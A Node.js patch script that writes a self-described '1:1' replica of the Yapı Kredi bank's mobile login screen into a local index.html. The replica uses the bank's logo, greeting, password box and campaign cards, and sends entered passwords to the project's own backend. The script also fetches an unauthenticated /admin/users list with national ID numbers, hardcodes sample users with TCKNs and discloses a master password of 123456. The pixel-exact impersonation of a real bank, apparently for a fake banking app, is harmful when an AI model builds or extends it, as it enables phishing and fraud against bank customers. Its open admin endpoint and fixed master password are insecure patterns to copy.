const fs = require('fs');
const path = require('path');

const logoBase64 = fs.readFileSync(path.join(__dirname, 'mobile_app', 'logo_base64.txt'), 'utf8').trim();
let content = fs.readFileSync(path.join(__dirname, 'mobile_app', 'index.html'), 'utf8');

// 1. CSS REPLACEMENT
const cssStartMarker = '/* YAPİ KREDİ MOBİL GİRİŞ EKRANI */';
const cssEndMarker = '</style>';

const newCss = `/* ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) */
        .ykb-real-login-screen {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            width: 100%;
            height: 100%;
            background: #000000;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            z-index: 9999;
            overflow-y: auto;
            overflow-x: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            padding-bottom: 74px;
            box-sizing: border-box;
            user-select: none;
        }

        /* Üst Header */
        .ykb-login-topbar {
            height: 60px;
            padding: 12px 18px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
        }

        .ykb-switch-btn {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            border: 1px solid rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            cursor: pointer;
            transition: background 0.2s;
            position: relative;
        }
        .ykb-switch-btn:active {
            background: rgba(255, 255, 255, 0.15);
        }

        /* Profil geçiş tooltip balonu */
        .ykb-switch-tooltip {
            position: absolute;
            top: 52px;
            left: 0;
            background: #262628;
            color: #ffffff;
            border-radius: 12px;
            padding: 10px 14px;
            max-width: 220px;
            font-size: 11px;
            line-height: 1.35;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
            z-index: 100;
            display: flex;
            align-items: flex-start;
            gap: 6px;
            cursor: pointer;
        }
        .ykb-switch-tooltip::before {
            content: "";
            position: absolute;
            top: -6px;
            left: 14px;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-bottom: 6px solid #262628;
        }
        .ykb-switch-tooltip-close {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            cursor: pointer;
            margin-left: 4px;
            line-height: 1;
        }

        .ykb-login-logo {
            height: 27px;
            object-fit: contain;
        }

        .ykb-login-bell-btn {
            background: transparent;
            border: none;
            color: #ffffff;
            font-size: 22px;
            cursor: pointer;
            padding: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Orta Avatar ve Selamlama */
        .ykb-login-center {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 10px 20px 0;
            width: 100%;
            max-width: 380px;
            margin: 0 auto;
        }

        .ykb-avatar-wrap {
            position: relative;
            width: 114px;
            height: 114px;
            border-radius: 50%;
            background: #dbe2ea;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
        }

        .ykb-avatar-badge {
            position: absolute;
            bottom: 2px;
            right: 2px;
            width: 34px;
            height: 34px;
            border-radius: 50%;
            background: #007bc7;
            border: 2.5px solid #000000;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            box-shadow: 0 2px 8px rgba(0, 123, 199, 0.4);
        }

        .ykb-greeting-title {
            margin-top: 18px;
            font-size: 17px;
            font-weight: 500;
            color: #ffffff;
            letter-spacing: -0.2px;
        }

        /* Beyaz Şifre Kutusu */
        .ykb-password-box {
            width: 100%;
            height: 52px;
            background: #ffffff;
            border-radius: 14px;
            margin-top: 22px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            position: relative;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: text;
        }
        .ykb-password-box.shake {
            animation: shakePass 0.4s ease;
            box-shadow: 0 0 0 2px #ef4444;
        }
        @keyframes shakePass {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-8px); }
            40%, 80% { transform: translateX(8px); }
        }

        .ykb-pass-lock-icon {
            color: #8e8e93;
            font-size: 17px;
            flex-shrink: 0;
        }

        .ykb-pass-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            font-size: 16px;
            font-weight: 500;
            color: #000000;
            text-align: center;
            padding: 0 8px;
            letter-spacing: 2px;
        }
        .ykb-pass-input::placeholder {
            color: #8e8e93;
            letter-spacing: normal;
            font-weight: 400;
        }

        .ykb-pass-action-btn {
            background: transparent;
            border: none;
            color: #007bc7;
            font-size: 22px;
            cursor: pointer;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: transform 0.15s, opacity 0.2s;
        }
        .ykb-pass-action-btn:active {
            transform: scale(0.9);
        }

        .ykb-forgot-pass-row {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            margin-top: 12px;
        }
        .ykb-forgot-pass-link {
            color: #ffffff;
            font-size: 13.5px;
            text-decoration: none;
            opacity: 0.95;
            cursor: pointer;
        }
        .ykb-forgot-pass-link:hover {
            text-decoration: underline;
        }

        .ykb-login-error-msg {
            display: none;
            color: #f87171;
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            width: 100%;
            background: rgba(239, 68, 68, 0.15);
            padding: 6px 12px;
            border-radius: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        /* Alt Kampanya Kartları Slider */
        .ykb-campaign-carousel-wrap {
            position: relative;
            margin-top: 24px;
            margin-bottom: 10px;
        }

        .ykb-campaign-carousel {
            display: flex;
            gap: 12px;
            overflow-x: auto;
            padding: 0 16px;
            scrollbar-width: none;
            -ms-overflow-style: none;
        }
        .ykb-campaign-carousel::-webkit-scrollbar {
            display: none;
        }

        .ykb-campaign-card {
            min-width: 280px;
            width: 280px;
            height: 86px;
            background: #1c1c1e;
            border-radius: 14px;
            padding: 10px 14px;
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            flex-shrink: 0;
            transition: transform 0.15s ease;
        }
        .ykb-campaign-card:active {
            transform: scale(0.98);
        }

        .ykb-campaign-icon-badge {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            color: #ffffff;
            font-size: 22px;
            box-shadow: 0 3px 10px rgba(0, 123, 199, 0.3);
        }

        .ykb-campaign-text {
            color: #ffffff;
            font-size: 12px;
            font-weight: 600;
            line-height: 1.35;
        }

        /* Alt ATM / Şube Tooltip */
        .ykb-atm-tooltip {
            position: absolute;
            right: 14px;
            bottom: 74px;
            background: #262628;
            color: #ffffff;
            border-radius: 12px;
            padding: 8px 12px;
            max-width: 175px;
            font-size: 11px;
            line-height: 1.3;
            font-weight: 500;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.7);
            z-index: 100;
            cursor: pointer;
        }
        .ykb-atm-tooltip::after {
            content: "";
            position: absolute;
            bottom: -6px;
            right: 28px;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-top: 6px solid #262628;
        }

        /* Alt Sabit Bar (Footer) */
        .ykb-login-bottombar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: 70px;
            background: #000000;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            display: flex;
            align-items: center;
            justify-content: space-around;
            padding: 0 8px;
            z-index: 999;
            max-width: 430px;
            margin: 0 auto;
        }

        .ykb-bottom-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #9ca3af;
            text-decoration: none;
            gap: 4px;
            cursor: pointer;
            padding: 4px 0;
        }
        .ykb-bottom-item:active {
            opacity: 0.7;
        }

        .ykb-bottom-icon {
            font-size: 19px;
            color: #ffffff;
            line-height: 1;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .ykb-bottom-label {
            font-size: 8.5px;
            font-weight: 700;
            letter-spacing: 0.2px;
            color: #cbd5e1;
            text-transform: uppercase;
        }

        /* JET QR Butonu */
        .ykb-jet-qr-btn {
            width: 44px;
            height: 40px;
            border-radius: 11px;
            background: #009fe3;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
            font-size: 22px;
            box-shadow: 0 2px 10px rgba(0, 159, 227, 0.45);
        }

        /* Kullanıcı Değiştirme Modal (Bottom Sheet) */
        .ykb-user-sheet-modal .modal-content {
            background: #18191b;
            color: #ffffff;
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 16px;
        }
        .ykb-user-sheet-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 14px;
            background: #242528;
            border-radius: 14px;
            margin-bottom: 8px;
            cursor: pointer;
            transition: background 0.15s;
        }
        .ykb-user-sheet-item:hover, .ykb-user-sheet-item:active {
            background: #2e3034;
        }
        .ykb-user-sheet-item.active {
            border: 1.5px solid #009fe3;
            background: rgba(0, 159, 227, 0.12);
        }
`;

const idxCssStart = content.indexOf(cssStartMarker);
const idxCssEnd = content.indexOf(cssEndMarker);
if (idxCssStart === -1 || idxCssEnd === -1) {
    console.error('CSS marker bulunamadı!');
    process.exit(1);
}
content = content.slice(0, idxCssStart) + newCss + '    ' + content.slice(idxCssEnd);
console.log('[1/4] CSS başarıyla güncellendi.');

// 2. HTML REPLACEMENT (#mobileLoginPage)
const htmlStartMarker = '<div id="mobileLoginPage" class="mobile-login-screen" style="display: none;">';
const htmlEndMarker = '<div class="dark-home-panel">';

const newHtml = `<!-- ORİJİNAL YAPI KREDİ MOBİL GİRİŞ EKRANI (1:1 BİREBİR) -->
        <div id="mobileLoginPage" class="ykb-real-login-screen" style="display: none;">
            <!-- ÜST HEADER: GEÇİŞ BUTONU + LOGO + BİLDİRİM -->
            <div class="ykb-login-topbar">
                <div class="position-relative">
                    <button type="button" class="ykb-switch-btn" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir">
                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
                            <rect x="0.5" y="1" width="9" height="6.5" rx="1.5" stroke="white" stroke-width="1.1"/>
                            <text x="2" y="6" fill="white" font-size="4.5" font-family="-apple-system, sans-serif" font-weight="700">TR</text>
                            <circle cx="15.5" cy="11.5" r="3.2" stroke="white" stroke-width="1.2"/>
                            <path d="M12 19.5c0-2.2 1.6-3.8 3.5-3.8s3.5 1.6 3.5 3.8" stroke="white" stroke-width="1.2"/>
                            <path d="M7.5 11.5a6.5 6.5 0 0 1 1.8-4.5" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
                            <path d="M6.5 9.5l2.2 2 1.8-2" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M19 8a6.5 6.5 0 0 1 .8 4.2" stroke="white" stroke-width="1.2" stroke-linecap="round"/>
                            <path d="M21 10.5l-2-2.2-2 1.8" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>

                    <!-- Profil Geçiş Tooltip Balonu (Orijinal Ekrandaki Metin) -->
                    <div id="ykbSwitchTooltip" class="ykb-switch-tooltip">
                        <div style="flex: 1;" onclick="openUserSwitcherSheet()">
                            Bireysel ve Kurumsal profilleriniz arasında geçiş yapabilir ya da başka kullanıcı ile kolayca giriş yapabilirsiniz!
                        </div>
                        <span class="ykb-switch-tooltip-close" onclick="dismissSwitchTooltip(event)" title="Kapat">&times;</span>
                    </div>
                </div>

                <!-- Ortada Orijinal Yapı Kredi Beyaz Logosu -->
                <div style="display: flex; align-items: center; justify-content: center;">
                    <img src="${logoBase64}" alt="Yapı Kredi" class="ykb-login-logo">
                </div>

                <!-- Sağda Bildirim Çanı -->
                <div>
                    <button type="button" class="ykb-login-bell-btn" onclick="alert('Yeni bildiriminiz bulunmamaktadır.')" title="Bildirimler">
                        <i class="bi bi-bell"></i>
                    </button>
                </div>
            </div>

            <!-- ORTA ALAN: AVATAR + SELAMLAMA + BEYAZ ŞİFRE KUTUSU -->
            <div class="ykb-login-center">
                <!-- Yuvarlak Profil Resmi + Mavi Dokunma Rozeti -->
                <div class="ykb-avatar-wrap" onclick="openUserSwitcherSheet()" title="Kullanıcı Değiştir">
                    <svg width="72" height="72" viewBox="0 0 64 64" fill="none">
                        <circle cx="32" cy="22" r="13" fill="#cbd5e1"/>
                        <path d="M12 55C12 43 20.95 38 32 38C43.05 38 52 43 52 55" fill="#cbd5e1"/>
                    </svg>
                    <div class="ykb-avatar-badge" title="Profil Değiştir">
                        <i class="bi bi-hand-index-thumb-fill" style="font-size: 16px; color: #ffffff; transform: rotate(-10deg);"></i>
                    </div>
                </div>

                <!-- Dinamik Selamlama ve Hesap Sahibi İsmi (Örn: İyi Geceler, BERKAY ÜLKER) -->
                <div class="ykb-greeting-title" id="ykbLoginGreeting">
                    İyi Geceler, BERKAY ÜLKER
                </div>

                <!-- Beyaz Şifre Hap Kutusu (Orijinal Yapı Kredi 1:1) -->
                <div class="ykb-password-box" id="ykbPasswordBox" onclick="document.getElementById('ykbPasswordInput').focus()">
                    <i class="bi bi-lock-fill ykb-pass-lock-icon"></i>
                    <input 
                        type="password" 
                        id="ykbPasswordInput" 
                        class="ykb-pass-input" 
                        placeholder="Şifre" 
                        maxlength="20" 
                        inputmode="numeric" 
                        autocomplete="current-password"
                        onkeydown="onPasswordKeyDown(event)"
                        oninput="onPasswordInput(event)"
                    />
                    <button type="button" class="ykb-pass-action-btn" id="ykbPassSubmitBtn" onclick="doMobilePasswordLogin()" title="Giriş Yap">
                        <i class="bi bi-arrow-right-circle-fill"></i>
                    </button>
                </div>

                <!-- Hata Bildirimi (Şifre Yanlış Olduğunda) -->
                <div id="ykbLoginErrorBanner" class="ykb-login-error-msg">
                    Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.
                </div>

                <!-- Şifremi Unuttum Bağlantısı -->
                <div class="ykb-forgot-pass-row">
                    <a href="javascript:void(0)" class="ykb-forgot-pass-link" onclick="handleForgotPassword()">Şifremi Unuttum</a>
                </div>
            </div>

            <!-- ALT KAMPANYA KARTLARI SLIDER (Orijinal Ekrandaki Kartlar) -->
            <div class="ykb-campaign-carousel-wrap">
                <div class="ykb-campaign-carousel">
                    <!-- Kart 1: Araç Kiralama -->
                    <div class="ykb-campaign-card" onclick="alert('Kampanya detayları yakında aktif olacaktır.')">
                        <div class="ykb-campaign-icon-badge">
                            <i class="bi bi-car-front-fill" style="font-size: 24px; color: #ffffff;"></i>
                        </div>
                        <div class="ykb-campaign-text">
                            Yapı Kredi müşterilerine özel araç kiralama fırsatı!
                        </div>
                    </div>

                    <!-- Kart 2: Global Finance Ödülü -->
                    <div class="ykb-campaign-card" onclick="alert('Global Finance Best Digital Bank Awards 2026')">
                        <div class="ykb-campaign-icon-badge" style="background: radial-gradient(circle at 35% 30%, #38bdf8 0%, #007bc7 85%);">
                            <i class="bi bi-trophy-fill" style="font-size: 23px; color: #ffc107;"></i>
                        </div>
                        <div class="ykb-campaign-text">
                            Global Finance Best Digital Bank Awards 2026'da büyük ödül!
                        </div>
                    </div>

                    <!-- Kart 3: World Pay / Puan -->
                    <div class="ykb-campaign-card" onclick="alert('World Puan Fırsatları')">
                        <div class="ykb-campaign-icon-badge" style="background: radial-gradient(circle at 35% 30%, #a855f7 0%, #007bc7 85%);">
                            <i class="bi bi-gift-fill" style="font-size: 21px; color: #ffffff;"></i>
                        </div>
                        <div class="ykb-campaign-text">
                            World üye işyerlerinde 500 TL Worldpuan hediye!
                        </div>
                    </div>
                </div>

                <!-- ATM / Şube İşlemleri Tooltip Balonu (Aşağıyı İşaret Eden Orijinal Tooltip) -->
                <div id="ykbAtmTooltip" class="ykb-atm-tooltip" onclick="dismissAtmTooltip()">
                    ATM / Şube işlemlerine artık buradan ulaşabilirsiniz!
                </div>
            </div>

            <!-- ALT SABİT MENÜ BARI: FAST İŞLEMLERİ, PİYASALAR, JET QR, WORLD PAY, DAHA FAZLASI -->
            <div class="ykb-login-bottombar">
                <!-- FAST İŞLEMLERİ -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('FAST İşlemleri')">
                    <div class="ykb-bottom-icon">
                        <span style="font-weight: 800; font-style: italic; font-size: 15px; color: #ffffff; letter-spacing: -0.5px;">fast</span>
                    </div>
                    <span class="ykb-bottom-label">FAST İŞLEMLERİ</span>
                </a>

                <!-- PİYASALAR -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Piyasalar')">
                    <div class="ykb-bottom-icon">
                        <i class="bi bi-graph-up-arrow" style="font-size: 18px; color: #ffffff;"></i>
                    </div>
                    <span class="ykb-bottom-label">PİYASALAR</span>
                </a>

                <!-- JET QR (Ortadaki Vurgulu Mavi Kare) -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('Jet QR')">
                    <div class="ykb-jet-qr-btn">
                        <i class="bi bi-qr-code-scan"></i>
                    </div>
                    <span class="ykb-bottom-label" style="color: #ffffff; margin-top: 2px;">JET QR</span>
                </a>

                <!-- WORLD PAY -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="promptLoginForAction('World Pay')">
                    <div class="ykb-bottom-icon">
                        <span style="font-weight: 900; font-style: italic; font-size: 14px; color: #ffffff; letter-spacing: 0.5px;">PAY</span>
                    </div>
                    <span class="ykb-bottom-label">WORLD PAY</span>
                </a>

                <!-- DAHA FAZLASI -->
                <a href="javascript:void(0)" class="ykb-bottom-item" onclick="openUserSwitcherSheet()">
                    <div class="ykb-bottom-icon">
                        <i class="bi bi-list" style="font-size: 22px; color: #ffffff;"></i>
                    </div>
                    <span class="ykb-bottom-label">DAHA FAZLASI</span>
                </a>
            </div>
        </div>

        `;

const idxHtmlStart = content.indexOf(htmlStartMarker);
const idxHtmlEnd = content.indexOf(htmlEndMarker);
if (idxHtmlStart === -1 || idxHtmlEnd === -1) {
    console.error('HTML marker bulunamadı!');
    process.exit(1);
}
content = content.slice(0, idxHtmlStart) + newHtml + content.slice(idxHtmlEnd);
console.log('[2/4] HTML login ekranı başarıyla güncellendi.');

// 3. USER SWITCH MODAL INSERTION
const modalInsertMarker = '<!-- Kullanıcı Profili ve Güvenli Çıkış Modalı -->';
const newModal = `<!-- Kullanıcı Değiştirme Modalı (Bottom Sheet) -->
    <div class="modal fade ykb-user-sheet-modal" id="ykbUserSwitchModal" tabindex="-1">
        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header border-0 pb-1 d-flex justify-content-between align-items-center">
                    <div>
                        <h5 class="modal-title fw-bold text-white mb-0" style="font-size: 18px;">
                            <i class="bi bi-people-fill text-primary me-2"></i>Kullanıcı Değiştir
                        </h5>
                        <div style="font-size: 11.5px; color: #8da2ba; margin-top: 3px;">
                            Giriş yapmak istediğiniz profili seçin
                        </div>
                    </div>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body pt-3">
                    <!-- Kayıtlı Kullanıcılar Listesi -->
                    <div id="ykbUserSheetList">
                        <!-- JS ile doldurulacak -->
                    </div>

                    <!-- Farklı Kullanıcı Adı / TCKN ile Giriş Yap -->
                    <div class="p-3 rounded-3 mt-3" style="background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);">
                        <label style="font-size: 12px; color: #94a3b8; font-weight: 600; margin-bottom: 6px; display: block;">
                            Farklı Kullanıcı Adı veya TCKN
                        </label>
                        <div class="input-group">
                            <input type="text" id="customUserSwitchInput" class="form-control" placeholder="Örn: ahmet veya TCKN" style="background: #111a28; color: #fff; border: 1px solid rgba(255,255,255,0.15); font-size: 13.5px;" />
                            <button class="btn btn-primary fw-bold px-3" type="button" onclick="selectCustomUser()">Seç</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    `;

const idxModal = content.indexOf(modalInsertMarker);
if (idxModal !== -1 && !content.includes('id="ykbUserSwitchModal"')) {
    content = content.slice(0, idxModal) + newModal + content.slice(idxModal);
    console.log('[3/4] Kullanıcı değiştirme modalı eklendi.');
}

// 4. JS REPLACEMENT
const jsStartMarker = 'function showLoginView() {';
const jsEndMarker = 'function logoutMobile() {';

const newJs = `function getLoginGreeting() {
            const hour = new Date().getHours();
            if (hour >= 5 && hour < 12) return 'Günaydın';
            if (hour >= 12 && hour < 18) return 'İyi Günler';
            if (hour >= 18 && hour < 23) return 'İyi Akşamlar';
            return 'İyi Geceler';
        }

        let activeRememberedUser = null;
        let allSavedUsers = [];

        function initLoginUser() {
            try {
                const saved = localStorage.getItem('YKB_SAVED_LOGIN_USER');
                if (saved) {
                    activeRememberedUser = JSON.parse(saved);
                }
            } catch (e) {}

            if (!activeRememberedUser || !activeRememberedUser.username) {
                activeRememberedUser = {
                    username: 'kaan',
                    customer_name: 'BERKAY ÜLKER'
                };
            }

            renderLoginUserState();
            fetchUsersListForSwitcher();
        }

        function renderLoginUserState() {
            if (!activeRememberedUser) return;
            const greetingEl = document.getElementById('ykbLoginGreeting');
            if (greetingEl) {
                const greetingPrefix = getLoginGreeting();
                const name = (activeRememberedUser.customer_name || activeRememberedUser.username || 'BERKAY ÜLKER').toUpperCase();
                greetingEl.textContent = \`\${greetingPrefix}, \${name}\`;
            }
        }

        async function fetchUsersListForSwitcher() {
            try {
                const res = await fetch(\`\${API_BASE}/admin/users\`);
                const data = await res.json();
                if (data.success && Array.isArray(data.users)) {
                    allSavedUsers = data.users;
                    renderUserSwitcherList();
                    // Eğer aktif kullanıcı varsa müşteri adını güncelle
                    if (activeRememberedUser) {
                        const matched = allSavedUsers.find(u => u.username.toLowerCase() === activeRememberedUser.username.toLowerCase());
                        if (matched && matched.customer_name) {
                            activeRememberedUser.customer_name = matched.customer_name;
                            renderLoginUserState();
                        }
                    }
                }
            } catch (e) {
                console.warn('Could not fetch user list:', e);
            }
        }

        function renderUserSwitcherList() {
            const listEl = document.getElementById('ykbUserSheetList');
            if (!listEl) return;
            if (!allSavedUsers.length) {
                allSavedUsers = [
                    { id: 1, username: 'kaan', customer_name: 'BERKAY ÜLKER', tckn: '12345678901' },
                    { id: 2, username: 'mert', customer_name: 'MERT AKBAŞ', tckn: '98765432109' },
                    { id: 1791642989862, username: 'ahmet', customer_name: 'AHMET YILMAZ', tckn: '99407014040' }
                ];
            }

            listEl.innerHTML = allSavedUsers.map(u => {
                const isActive = activeRememberedUser && (activeRememberedUser.username.toLowerCase() === u.username.toLowerCase());
                const name = (u.customer_name || u.username).toUpperCase();
                const initial = name.charAt(0);
                return \`
                    <div class="ykb-user-sheet-item \${isActive ? 'active' : ''}" onclick="selectLoginUser('\${u.username}', '\${name}')">
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <div style="width: 40px; height: 40px; border-radius: 50%; background: #007bc7; display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff;">
                                \${initial}
                            </div>
                            <div>
                                <div style="font-size: 14px; font-weight: 600; color: #ffffff;">\${name}</div>
                                <div style="font-size: 11.5px; color: #8da2ba;">Kullanıcı: \${u.username} \${u.tckn ? '| TCKN: ' + u.tckn.slice(0,3) + '***' : ''}</div>
                            </div>
                        </div>
                        <div>
                            \${isActive ? '<i class=\"bi bi-check-circle-fill\" style=\"color: #009fe3; font-size: 20px;\"></i>' : '<i class=\"bi bi-chevron-right\" style=\"color: #64748b;\"></i>'}
                        </div>
                    </div>
                \`;
            }).join('');
        }

        function openUserSwitcherSheet() {
            fetchUsersListForSwitcher();
            const modalEl = document.getElementById('ykbUserSwitchModal');
            if (modalEl) {
                const modal = new bootstrap.Modal(modalEl);
                modal.show();
            }
        }

        function selectLoginUser(username, customerName) {
            activeRememberedUser = {
                username: username,
                customer_name: customerName
            };
            localStorage.setItem('YKB_SAVED_LOGIN_USER', JSON.stringify(activeRememberedUser));
            renderLoginUserState();
            const passInput = document.getElementById('ykbPasswordInput');
            if (passInput) {
                passInput.value = '';
                passInput.focus();
            }
            const errBox = document.getElementById('ykbLoginErrorBanner');
            if (errBox) errBox.style.display = 'none';

            const modalEl = document.getElementById('ykbUserSwitchModal');
            if (modalEl) {
                const modal = bootstrap.Modal.getInstance(modalEl);
                if (modal) modal.hide();
            }
        }

        function selectCustomUser() {
            const input = document.getElementById('customUserSwitchInput');
            const val = input ? input.value.trim() : '';
            if (!val) return;
            selectLoginUser(val, val.toUpperCase());
            if (input) input.value = '';
        }

        function onPasswordKeyDown(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                doMobilePasswordLogin();
            }
        }

        function onPasswordInput(e) {
            const val = e.target.value.trim();
            const errBox = document.getElementById('ykbLoginErrorBanner');
            if (errBox) errBox.style.display = 'none';

            // 6 haneli şifre girildiğinde otomatik doğrulama dene
            if (val.length === 6) {
                setTimeout(() => {
                    if (document.getElementById('ykbPasswordInput').value.trim().length === 6) {
                        doMobilePasswordLogin();
                    }
                }, 150);
            }
        }

        async function doMobilePasswordLogin() {
            const passInput = document.getElementById('ykbPasswordInput');
            const passVal = passInput ? passInput.value.trim() : '';
            const errBox = document.getElementById('ykbLoginErrorBanner');
            const passBox = document.getElementById('ykbPasswordBox');
            const submitBtn = document.getElementById('ykbPassSubmitBtn');

            if (!passVal) {
                if (passInput) passInput.focus();
                return;
            }

            const username = activeRememberedUser ? activeRememberedUser.username : 'kaan';

            if (submitBtn) {
                submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm" style="font-size: 14px;"></span>';
            }

            try {
                const res = await fetch(\`\${API_BASE}/auth/login\`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: username, password: passVal })
                });
                const data = await res.json();

                if (!res.ok || !data.success) {
                    if (passBox) {
                        passBox.classList.add('shake');
                        setTimeout(() => passBox.classList.remove('shake'), 450);
                    }
                    if (errBox) {
                        errBox.textContent = data.message || 'Girdiğiniz şifre hatalıdır. Lütfen kontrol ediniz.';
                        errBox.style.display = 'block';
                    }
                    if (passInput) {
                        passInput.value = '';
                        passInput.focus();
                    }
                    return;
                }

                currentMobileUser = {
                    id: data.user.id,
                    username: data.user.username,
                    tckn: data.user.tckn,
                    role: data.user.role,
                    token: data.token,
                    account: data.user.account
                };

                localStorage.setItem('YKB_MOBILE_AUTH', JSON.stringify(currentMobileUser));
                localStorage.setItem('YKB_SAVED_LOGIN_USER', JSON.stringify({
                    username: currentMobileUser.username,
                    customer_name: data.user.account?.customer_name || currentMobileUser.username
                }));

                if (passInput) passInput.value = '';
                if (errBox) errBox.style.display = 'none';

                showMainAppView();
                await loadMobileApp();
            } catch (err) {
                console.error('Login error:', err);
                if (errBox) {
                    errBox.textContent = 'Sunucu bağlantısı sağlanamadı. Lütfen tekrar deneyin.';
                    errBox.style.display = 'block';
                }
            } finally {
                if (submitBtn) {
                    submitBtn.innerHTML = '<i class="bi bi-arrow-right-circle-fill"></i>';
                }
            }
        }

        function handleForgotPassword() {
            alert('Şifrenizi Yapı Kredi Mobil Admin panelinden belirleyebilir veya varsayılan master şifre (123456) ile giriş yapabilirsiniz.');
        }

        function dismissSwitchTooltip(e) {
            if (e) e.stopPropagation();
            const el = document.getElementById('ykbSwitchTooltip');
            if (el) el.style.display = 'none';
        }

        function dismissAtmTooltip() {
            const el = document.getElementById('ykbAtmTooltip');
            if (el) el.style.display = 'none';
        }

        function promptLoginForAction(actionName) {
            const passInput = document.getElementById('ykbPasswordInput');
            if (passInput) {
                passInput.focus();
                const passBox = document.getElementById('ykbPasswordBox');
                if (passBox) {
                    passBox.classList.add('shake');
                    setTimeout(() => passBox.classList.remove('shake'), 450);
                }
            }
        }

        function showLoginView() {
            const loginPage = document.getElementById('mobileLoginPage');
            const homeTop = document.querySelector('.dark-home-panel');
            const homeBottom = document.querySelector('.lower-home-panel');
            if (loginPage) loginPage.style.display = 'flex';
            if (homeTop) homeTop.style.display = 'none';
            if (homeBottom) homeBottom.style.display = 'none';
            const accDetail = document.getElementById('accountDetailPage');
            if (accDetail) accDetail.style.display = 'none';
            const txDetail = document.getElementById('accountTransactionsPage');
            if (txDetail) txDetail.style.display = 'none';
            const mvDetail = document.getElementById('movementDetailPage');
            if (mvDetail) mvDetail.style.display = 'none';
            const rcpDetail = document.getElementById('demoReceiptPage');
            if (rcpDetail) rcpDetail.style.display = 'none';

            initLoginUser();
        }

        function showMainAppView() {
            const loginPage = document.getElementById('mobileLoginPage');
            const homeTop = document.querySelector('.dark-home-panel');
            const homeBottom = document.querySelector('.lower-home-panel');
            if (loginPage) loginPage.style.display = 'none';
            if (homeTop) homeTop.style.display = '';
            if (homeBottom) homeBottom.style.display = '';
        }

        `;

const idxJsStart = content.indexOf(jsStartMarker);
const idxJsEnd = content.indexOf(jsEndMarker);
if (idxJsStart === -1 || idxJsEnd === -1) {
    console.error('JS marker bulunamadı!');
    process.exit(1);
}
content = content.slice(0, idxJsStart) + newJs + content.slice(idxJsEnd);
console.log('[4/4] JS fonksiyonları başarıyla güncellendi.');

fs.writeFileSync(path.join(__dirname, 'mobile_app', 'index.html'), content, 'utf8');
console.log('TÜM GÜNCELLEMELER mobile_app/index.html DOSYASINA YAZILDI!');
